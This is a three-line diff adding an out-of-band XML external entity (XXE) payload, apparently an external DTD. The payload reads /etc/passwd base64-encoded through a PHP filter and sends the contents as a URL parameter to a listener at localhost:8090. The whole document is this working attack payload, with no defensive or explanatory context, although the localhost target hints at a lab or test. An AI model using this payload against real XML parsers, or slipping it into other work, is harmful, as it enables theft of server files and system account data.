@@ -1,0 +1,3 @@
+<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://localhost:8090/?data=%cmd;'>">
+%oobxxe;
